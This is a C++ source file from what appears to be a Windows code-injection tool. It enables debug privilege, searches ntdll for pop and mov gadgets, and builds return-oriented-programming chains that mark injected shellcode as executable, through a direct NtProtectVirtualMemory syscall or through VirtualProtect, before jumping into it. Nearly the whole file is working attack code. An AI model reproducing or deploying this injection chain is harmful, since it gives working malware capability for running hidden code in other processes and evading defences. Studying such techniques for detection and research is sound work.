
#include "stdafx.h"
#include "ROPBuffer.h"

#define 	SE_DEBUG_PRIVILEGE   (20L)


BOOL EnableDebugPriv()
{
	BOOL RetVal = FALSE;
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES priv = { 0 };

	if (FALSE == OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		goto Leave;
	}

	priv.PrivilegeCount = 1;
	priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	priv.Privileges[0].Luid.HighPart = 0;
	priv.Privileges[0].Luid.LowPart = SE_DEBUG_PRIVILEGE;

	if (FALSE == AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL))
	{
		goto Leave;
	}

	RetVal = TRUE;
Leave:
	if (NULL != hToken)
		CloseHandle(hToken);

	return RetVal;
}

DWORD GetPageSize()
{
	static SYSTEM_INFO si = { 0 };
	
	if (0 == si.dwPageSize)
		GetSystemInfo(&si);

	return si.dwPageSize;
}

// Very ugly way to search for gadgets, but for our usage it works
ULONGLONG FindPopGadgets(BYTE* Ntdll, BYTE* PopGadgets, size_t PopGadgetsLen)
{

	ULONGLONG i = 0;
	size_t j = 0;

	for (i = 0; i < 0x100000; ++i)
	{
		for (j = 0; j < PopGadgetsLen; ++j)
		{
			if (PopGadgets[j] != Ntdll[i + j])
				break;
		}
		if (j == PopGadgetsLen)
			return (ULONGLONG)&Ntdll[i];
	}

	return 0;
}


ULONGLONG NtYieldExecution = NULL;
ULONGLONG CreateMutexAddress = NULL;
ULONGLONG RtlExitUserThreadAddress = NULL;
ULONGLONG VirtualProtectAddress = NULL;
ULONGLONG PopGadgets1Address = NULL;
ULONGLONG PopGadgets2Address = NULL;
ULONGLONG PopR10GadgetAddress = NULL;


BOOL FindFunctionAddresses()
{
	BOOL RetVal = FALSE;
	HMODULE NtdllHandle = NULL;
	HMODULE Kernel32Handle = NULL;
	HMODULE KernelBaseHandle = NULL;

	// Either this or the following gadget is found on Windows 10 (depends on version)
	BYTE PopGadgets1[] = {
		0x58,			// pop rax
		0x5a,			// pop rdx
		0x59,			// pop rcx
		0x41, 0x58,		// pop r8
		0x41, 0x59,		// pop r9
		0xc3			// ret
	};

	BYTE PopGadgets2[] = {
		0x58,			// pop rax
		0x5a,			// pop rdx
		0x59,			// pop rcx
		0x41, 0x58,		// pop r8
		0x41, 0x59,		// pop r9
		0x41, 0x5a,		// pop r10
		0x41, 0x5b,		// pop r11
		0xc3			// ret
	};

	// This gadget always exists on Windows 7 through 10 and complements the first option of previous gadget
	BYTE PopR10Gadget[] = {
		0x4C, 0x8B, 0x14, 0x24,			// mov r10, [rsp]
		0x4C, 0x8B, 0x5C, 0x24, 0x08,	// mov r11, [rsp + 8]
		0x48, 0x83, 0xC4, 0x10,			// sub rsp, 0x10
		0xC3							// ret
	};

	NtdllHandle = LoadLibraryW(L"ntdll.dll");
	if (NULL == NtdllHandle)
		goto Leave;
	Kernel32Handle = LoadLibraryW(L"kernel32.dll");
	if (NULL == Kernel32Handle)
		goto Leave;
	KernelBaseHandle = LoadLibraryW(L"KernelBase.dll");
	if (NULL == KernelBaseHandle)
		goto Leave;

	NtYieldExecution = (ULONGLONG)GetProcAddress(NtdllHandle, "NtYieldExecution");
	if (NULL == NtYieldExecution)
		goto Leave;

	RtlExitUserThreadAddress = (ULONGLONG)GetProcAddress(NtdllHandle, "RtlExitUserThread");
	if (NULL == RtlExitUserThreadAddress)
		goto Leave;

	CreateMutexAddress = (ULONGLONG)GetProcAddress(Kernel32Handle, "CreateMutexA");
	if (NULL == CreateMutexAddress)
		goto Leave;

	VirtualProtectAddress = (ULONGLONG)GetProcAddress(KernelBaseHandle, "VirtualProtect");
	if (NULL == VirtualProtectAddress)
		goto Leave;

	PopGadgets1Address = FindPopGadgets((PBYTE)NtdllHandle, PopGadgets1, sizeof(PopGadgets1));
	PopGadgets2Address = FindPopGadgets((PBYTE)NtdllHandle, PopGadgets2, sizeof(PopGadgets2));
	if ((NULL == PopGadgets1Address) && (NULL == PopGadgets2Address))
		goto Leave;

	PopR10GadgetAddress = FindPopGadgets((PBYTE)NtdllHandle, PopR10Gadget, sizeof(PopR10Gadget));
	if (NULL == PopR10GadgetAddress)
		goto Leave;

	RetVal = TRUE;
Leave:
	if (NULL != KernelBaseHandle)
		FreeLibrary(KernelBaseHandle);
	if (NULL != Kernel32Handle)
		FreeLibrary(Kernel32Handle);
	if (NULL != NtdllHandle)
		FreeLibrary(NtdllHandle);

	return RetVal;
}



void BuildRiteOfPassageRop(ROPBuffer* Rop, ULONGLONG RemoteShellcode, ULONGLONG RemoteShellcodeAddress)
{
	// First gadget (will be set by updating Rip):
	// pop rax
	// pop rdx
	// pop rcx
	// pop r8
	// pop r9
	// (only on second option): pop r10
	// (only on second option): pop r11
	// ret

	// Second gadget will only be used if pop r10/r11 were missing on first gadget:
	// mov r10, [rsp]
	// mov r11, [rsp + 8]
	// sub rsp, 0x10
	// ret

	// First and second parameters will be used to prepare parameters for
	// direct system call for NtProtectVirtualMemory:
	//	(rax = NtProtectVirtualMemory system call number)
	//	NtProtectVirtualMemory(
	//			IN HANDLE               ProcessHandle,
	//			IN OUT PVOID            *BaseAddress,
	//			IN OUT PULONG           NumberOfBytesToProtect,
	//			IN ULONG                NewAccessProtection,
	//			OUT PULONG              OldAccessProtection );

	Rop->InsertRopValue(0x50);		// rax = 0x50 (system call number). NOTE: This will only work on Windows 10 !!!
	Rop->InsertRopDataPointer(RemoteShellcode); // rdx = *BaseAddress
	Rop->InsertRopValue((ULONGLONG)(-1)); // rcx = ProcessHandle (-1 = Current Process Handle)
	Rop->InsertRopDataPointer(GetPageSize()); // r8 = *NumberOfBytesToProtect
	Rop->InsertRopValue(PAGE_EXECUTE_READWRITE); // r9 = NewAccessProtection
	if (NULL != PopGadgets1Address)
	{
		Rop->SetRip(PopGadgets1Address);
		// We also need to pop r10 using a second gadget
		Rop->InsertRopValue(PopR10GadgetAddress); // Address of second gadget
	}
	else
	{
		Rop->SetRip(PopGadgets2Address);
	}
	Rop->InsertRopValue((ULONGLONG)(-1)); // r10 = ProcessHandle (-1 = Current Process Handle)
	Rop->InsertRopValue(0); // r11 = 0 (unused)
							// return directly to syscall opcode
	Rop->InsertRopValue(NtYieldExecution + 0x12);
	// return directly to shellcode
	Rop->InsertRopValue(RemoteShellcodeAddress);
	// Shadow stack space for Function call
	Rop->InsertRopValue(0);
	Rop->InsertRopValue(0);
	Rop->InsertRopValue(0);
	Rop->InsertRopValue(0);
	Rop->InsertRopDataPointer(0); // 5th parameter: *OldAccessProtection
}

void BuildSimpleRop(ROPBuffer* Rop, ULONGLONG RemoteShellcode, ULONGLONG RemoteShellcodeAddress)
{
	// First gadget (will be set by updating Rip):
	// pop rdx
	// pop rcx
	// pop r8
	// pop r9
	// (only on second option): pop r10
	// (only on second option): pop r11
	// ret

	// The first gadget will prepare parameters for
	//	VirtualProtect(
	//			LPVOID lpAddress,
	//			SIZE_T dwSize,
	//			DWORD  flNewProtect,
	//			PDWORD lpflOldProtect
	//		);
	Rop->InsertRopValue(GetPageSize()); // Rdx = dwSize
	Rop->InsertRopValue(RemoteShellcode); // Rcx = lpAddress
	Rop->InsertRopValue(PAGE_EXECUTE_READWRITE); // R8 = flNewProtect
	Rop->InsertRopDataPointer(0); // R9 = lpflOldProtect

	if (NULL != PopGadgets1Address)
	{
		Rop->SetRip(PopGadgets1Address + 1); // +1 to skip pop rax opcode
	}
	else // PopGadgets2Address - It also has pops R10 and R11
	{
		Rop->SetRip(PopGadgets2Address + 1); // +1 to skip pop rax opcode
		Rop->InsertRopValue(0); // R10 is unused
		Rop->InsertRopValue(0); // R11 is unused

	}
	// return to VirtualProtect
	Rop->InsertRopValue(VirtualProtectAddress);
	// return directly to shellcode
	Rop->InsertRopValue(RemoteShellcodeAddress);

}
